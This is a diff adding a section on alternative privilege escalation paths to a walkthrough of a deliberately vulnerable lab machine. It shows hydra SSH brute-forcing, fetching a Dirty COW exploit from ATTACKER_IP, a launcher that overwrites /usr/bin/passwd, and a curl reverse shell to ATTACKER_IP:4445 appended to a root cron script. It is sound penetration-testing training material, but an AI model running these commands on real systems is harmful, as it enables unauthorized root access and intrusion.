@@ -415,6 +415,308 @@ The machine has now been successfully compromised.
 
 ---
 
+# Alternative Privilege Escalation Paths
+
+One of the most interesting aspects of this machine is that it offers **multiple privilege escalation paths**. Rather than relying on a single intended solution, several different techniques can be used to obtain root access depending on how deeply the machine is enumerated.
+
+Below are the alternative privilege escalation paths that were discovered during the assessment.
+
+---
+
+# Privilege Escalation Path 1 – Enumerating Other User Credentials
+
+After obtaining an initial shell through the vulnerable WordPress installation, another possibility was to identify additional user credentials.
+
+Using the usernames recovered from the anonymous FTP share, password attacks were attempted against SSH.
+
+The first user tested was **john**.
+
+```bash id="pv6wtw"
+hydra -l john \
+-P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+ssh://192.168.56.139
+```
+
+However, Hydra immediately returned:
+
+```text id="76jmg5"
+Target does not support password authentication.
+```
+
+The same behaviour was observed for:
+
+* john
+* mai
+* abatchy
+* doomguy
+
+Each account rejected password authentication entirely.
+
+Only the **anne** account accepted password-based SSH authentication and eventually revealed valid credentials.
+
+This demonstrates why it is always worth testing every discovered account individually rather than assuming all users share identical SSH configurations.
+
+---
+
+# Testing FTP Credentials
+
+Since SSH authentication failed for most users, FTP authentication was investigated as well.
+
+The same usernames were tested using password attacks.
+
+Unfortunately, none of the discovered accounts produced valid FTP credentials.
+
+At this point no additional attack surface was gained through FTP.
+
+This left the previously obtained web shell as the primary avenue for further privilege escalation.
+
+---
+
+# Preparing the Web Shell
+
+The initial PHP reverse shell was functional but lacked a proper interactive terminal.
+
+The shell was upgraded using Python.
+
+```bash id="y7pdrt"
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After suspending the session:
+
+```text id="yzvygq"
+CTRL + Z
+```
+
+the attacker's terminal was configured.
+
+```bash id="qilz6e"
+stty raw -echo
+
+fg
+
+export TERM=xterm
+```
+
+This produced a much more stable interactive shell for local enumeration.
+
+---
+
+# Running LinPEAS
+
+With a stable shell established, LinPEAS was transferred to the target.
+
+Running LinPEAS revealed several interesting findings.
+
+One notable discovery was the presence of local-only services.
+
+```text id="bllrj0"
+127.0.0.1:3306
+
+MySQL
+```
+
+This confirmed that the machine hosted a locally accessible MySQL server.
+
+Although not directly exploitable, it represented another potential enumeration target.
+
+LinPEAS also highlighted something significantly more interesting.
+
+The running kernel appeared vulnerable to the well-known **Dirty COW** local privilege escalation vulnerability.
+
+---
+
+# Privilege Escalation Path 2 – Dirty COW (Compiled Exploit)
+
+Because the kernel version matched publicly available Dirty COW exploits, the first attempt involved compiling an existing proof-of-concept.
+
+The exploit source was downloaded.
+
+```bash id="ljb4xw"
+wget http://ATTACKER_IP:8000/40839.c
+```
+
+Compilation succeeded.
+
+```bash id="jlwm5e"
+gcc -pthread 40839.c -o dirty -lcrypt
+```
+
+Executing the exploit prompted for a new password.
+
+```text id="vuk2qq"
+Please enter the new password
+```
+
+Unfortunately, shortly after execution the target machine unexpectedly rebooted.
+
+The exploit was therefore considered unstable on this particular system.
+
+Rather than continuing with an unreliable kernel exploit, another Dirty COW implementation was investigated.
+
+---
+
+# Privilege Escalation Path 3 – DirtyCow Python Launcher
+
+Instead of compiling the traditional exploit, a Python-based launcher was uploaded.
+
+Executing:
+
+```bash id="tfqfw8"
+python dirtycow.py
+```
+
+presented two available options.
+
+```text id="2bhudw"
+[0]
+
+run_dirty_cow
+
+[1]
+
+run_replace_dirty_cow
+```
+
+Selecting:
+
+```text id="odtohm"
+0
+```
+
+triggered the privilege escalation.
+
+The launcher successfully replaced the system passwd binary.
+
+```text id="evz2j9"
+Backing up /usr/bin/passwd
+
+/usr/bin/passwd overwritten
+
+Popping root shell
+```
+
+Within seconds the exploit returned:
+
+```text id="7yq9qn"
+root@bsides2018
+```
+
+This method proved significantly more reliable than the compiled proof-of-concept and resulted in immediate root access.
+
+---
+
+# Investigating MySQL
+
+Although root access had already been achieved through Dirty COW, additional enumeration continued to identify other possible attack paths.
+
+Inspecting the WordPress configuration file revealed database credentials.
+
+```php id="g6wm2v"
+define('DB_NAME', 'wp');
+
+define('DB_USER', 'john@localhost');
+
+define('DB_PASSWORD', 'thiscannotbeit');
+```
+
+Using these credentials:
+
+```bash id="im08d2"
+mysql -u john@localhost -p
+```
+
+authentication succeeded.
+
+While database access was obtained, no immediately useful privilege escalation vector was identified inside MySQL.
+
+The database did not provide direct operating system command execution.
+
+This path ultimately proved to be a dead end.
+
+---
+
+# Privilege Escalation Path 4 – Cron Job Abuse
+
+Returning to LinPEAS output uncovered another interesting finding.
+
+Inspecting the system crontab revealed:
+
+```text id="hysyn5"
+* * * * *
+
+root
+
+/usr/local/bin/cleanup
+```
+
+A root-owned script was executing every minute.
+
+This immediately became the next focus of investigation.
+
+Viewing the script showed:
+
+```bash id="06m6pi"
+#!/bin/sh
+
+rm -rf /var/log/apache2/*
+```
+
+At first glance it simply removed Apache log files.
+
+However, if the script proved writable, it could potentially be abused.
+
+Appending a reverse shell payload to the cleanup script:
+
+```bash id="4fdlrg"
+echo "C='curl -Ns telnet://ATTACKER_IP:4445'; \
+\$C </dev/null 2>&1 | /bin/bash 2>&1 | \$C >/dev/null" \
+>> /usr/local/bin/cleanup
+```
+
+caused the next cron execution to run attacker-controlled commands as **root**.
+
+Once the scheduled task executed, a reverse shell connected back.
+
+Verifying privileges confirmed:
+
+```text id="zv83lh"
+uid=0(root)
+```
+
+The machine was successfully compromised through an entirely different privilege escalation technique.
+
+---
+
+# Comparing the Privilege Escalation Methods
+
+| Method                         | Result                        |
+| ------------------------------ | ----------------------------- |
+| Anne + sudo                    | Immediate root shell          |
+| Dirty COW (Compiled)           | Unstable, caused reboot       |
+| DirtyCow Python Launcher       | Successful root shell         |
+| WordPress Database Credentials | Enumeration only              |
+| Writable Cron Job              | Successful root reverse shell |
+
+---
+
+# Lessons Learned
+
+This machine is an excellent example of why local enumeration should never stop after discovering a single privilege escalation path.
+
+Although the **Anne** account already provided unrestricted sudo access, additional investigation uncovered several completely independent methods of becoming root.
+
+The machine demonstrates multiple real-world privilege escalation techniques, including:
+
+* Weak sudo configurations.
+* Linux kernel vulnerabilities (Dirty COW).
+* Writable cron jobs.
+* Database credential discovery.
+* Local service enumeration.
+
+Each path reinforces the importance of thorough post-exploitation enumeration. In real penetration tests and OSCP-style examinations, identifying multiple routes to the same objective strengthens both technical understanding and reporting quality by demonstrating the full attack surface rather than only the quickest solution.
+
+
 # Attack Flow
 
 ```text
